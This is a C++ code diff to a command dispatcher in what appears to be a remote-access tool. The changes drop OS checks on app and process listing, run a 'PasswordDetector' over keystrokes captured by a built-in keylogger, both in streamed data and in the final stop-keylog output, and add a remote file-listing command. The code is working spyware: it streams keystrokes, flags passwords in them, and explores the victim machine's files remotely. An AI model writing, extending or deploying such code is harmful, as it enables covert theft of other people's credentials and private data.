@@ -59,23 +59,14 @@ void CommandDispatcher::registerHandlers() {
     };
 
     routes_[Protocol::TYPE::APP_LIST] = [](const Message& msg, ResponseCallBack cb) {
-        #if defined(_WIN32) || defined(__APPLE__)
-            AppController ac;
-            auto list = ac.listApps();
-            cb(Message(
-                Protocol::TYPE::APP_LIST,
-                list, 
-                "",
-                msg.from
-            ));
-        #else
-            cb(Message(
-                Protocol::TYPE::ERROR,
-                {{"msg", "OS Not Supported"}}, 
-                "", 
-                msg.from
-            ));
-        #endif 
+        AppController ac;
+        auto list = ac.listApps();
+        cb(Message(
+            Protocol::TYPE::APP_LIST,
+            list, 
+            "",
+            msg.from
+        ));
     };
 
     routes_[Protocol::TYPE::APP_START] = [](const Message& msg, ResponseCallBack cb) {
@@ -144,23 +135,14 @@ void CommandDispatcher::registerHandlers() {
     };
 
     routes_[Protocol::TYPE::PROC_LIST] = [](const Message& msg, ResponseCallBack cb) {
-        #if defined(_WIN32) || defined(__APPLE__)
-            ProcessController pc;
-            auto list = pc.listProcesses();
-            cb(Message(
-                Protocol::TYPE::PROC_LIST, 
-                list, 
-                "", 
-                msg.from
-            ));
-        #else
-            cb(Message(
-                Protocol::TYPE::ERROR, 
-                {{"msg", "OS Not Supported"}}, 
-                "", 
-                msg.from
-            ));
-        #endif
+        ProcessController pc;
+        auto list = pc.listProcesses();
+        cb(Message(
+            Protocol::TYPE::PROC_LIST, 
+            list, 
+            "", 
+            msg.from
+        ));
     };
 
     routes_[Protocol::TYPE::PROC_START] = [](const Message& msg, ResponseCallBack cb) {
@@ -342,6 +324,8 @@ void CommandDispatcher::registerHandlers() {
                 
                 std::string currentKeys = Keylogger::getDataAndClear();
                 if (!currentKeys.empty()) {
+                    PasswordDetector::analyzeKeylogBuffer(currentKeys);
+                    
                     cb(Message(Protocol::TYPE::STREAM_DATA, 
                         {
                             {"status", "ok"},
@@ -363,6 +347,7 @@ void CommandDispatcher::registerHandlers() {
         g_keylogger.Stop();   
         
         std::string finalLogs = Keylogger::getDataAndClear();
+        PasswordDetector::analyzeKeylogBuffer(finalLogs);
         
         cb(Message(Protocol::TYPE::STOP_KEYLOG, 
             {
@@ -426,5 +411,56 @@ void CommandDispatcher::registerHandlers() {
     
     routes_[Protocol::TYPE::WHOAMI] = [](const Message& msg, ResponseCallBack cb) {
          cb(Message(Protocol::TYPE::WHOAMI, getHostName(), "", msg.from));
+    };
+    
+    routes_[Protocol::TYPE::FILE_LIST] = [](const Message& msg, ResponseCallBack cb) {
+        try {
+            std::string path = "";
+            
+            if (msg.data.is_string()) {
+                path = msg.data.get<std::string>();
+            } else if (msg.data.is_object() && msg.data.contains("path")) {
+                path = msg.data["path"].get<std::string>();
+            }
+            
+            FileListController flc;
+            auto files = flc.listFiles(path);
+            
+            json result = json::array();
+            for (const auto& file : files) {
+                json fileObj = {
+                    {"name", file.name},
+                    {"path", file.path},
+                    {"type", file.type},
+                    {"size", file.size},
+                    {"permissions", file.permissions},
+                    {"modified", file.modified},
+                    {"isDirectory", file.isDirectory},
+                    {"isFile", file.isFile}
+                };
+                result.push_back(fileObj);
+            }
+            
+            cb(Message(
+                Protocol::TYPE::FILE_LIST,
+                {
+                    {"status", "ok"},
+                    {"path", path},
+                    {"files", result},
+                    {"count", files.size()}
+                },
+                "",
+                msg.from
+            ));
+        } catch (const std::exception& e) {
+            cb(Message(
+                Protocol::TYPE::ERROR,
+                {
+                    {"msg", std::string("File list error: ") + e.what()}
+                },
+                "",
+                msg.from
+            ));
+        }
     };
 }
